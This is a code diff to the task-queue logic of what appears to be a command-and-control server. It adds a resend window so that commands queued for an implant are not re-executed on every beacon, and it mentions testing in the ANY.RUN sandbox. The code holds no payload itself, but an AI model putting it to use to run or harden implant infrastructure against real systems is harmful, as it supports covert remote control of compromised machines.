@@ -247,23 +247,34 @@ class Store:
 
         Only 'queued' and 'sent' are eligible. A task already sent but not yet
         acked is returned again on purpose: that is the at-least-once delivery
-        the implant's task-id dedup exists for. A task the implant has already
-        ACKED must NOT be re-served — it owns the task and is running (or has
-        run) it. The previous predicate was `state != 'done'`, which also matched
-        'acked', so an acked task whose result was lost got re-served on every
-        beacon; combined with the implant's immediate re-beacon that is a process
-        storm (one operator command re-executed hundreds of times).
+        the implant's task-id dedup exists for — but only after
+        `task_resend_after` seconds have passed since the last serve. The
+        window is the server-side guarantee that an implant with broken dedup
+        (no tid tracking, acks dropped, replayed beacons) can never turn one
+        task into a process storm: worst case it is re-served once per window,
+        not once per beacon. sent_ts ratchets on every serve so the window
+        always slides forward.
+
+        A task the implant has already ACKED must NOT be re-served — it owns
+        the task and is running (or has run) it. The previous predicate was
+        `state != 'done'`, which also matched 'acked', so an acked task whose
+        result was lost got re-served on every beacon; combined with the
+        implant's immediate re-beacon that is a process storm (one operator
+        command re-executed hundreds of times in ANY.RUN).
         """
+        resend_after = float(self._cfg.get("task_resend_after", 60))
         with self._lock, self._db:
             row = self._db.execute(
-                """SELECT seq, tid, cmd, state FROM tasks
-                   WHERE sid=? AND state IN ('queued','sent') ORDER BY seq LIMIT 1""", (sid,)).fetchone()
+                """SELECT seq, tid, cmd, state, sent_ts FROM tasks
+                   WHERE sid=? AND state IN ('queued','sent') ORDER BY seq LIMIT 1""",
+                (sid,)).fetchone()
             if not row:
                 return None
             transitioned = row["state"] == "queued"
-            if transitioned:
-                self._db.execute("UPDATE tasks SET state='sent', sent_ts=? WHERE seq=?",
-                                 (ts, row["seq"]))
+            if not transitioned and ts - row["sent_ts"] < resend_after:
+                return None   # just served — give the implant the window to ack/result
+            self._db.execute("UPDATE tasks SET state='sent', sent_ts=? WHERE seq=?",
+                             (ts, row["seq"]))
         return {"tid": row["tid"], "cmd": row["cmd"], "transitioned": transitioned}
 
     def ack_task(self, sid: str, tid: str) -> bool:
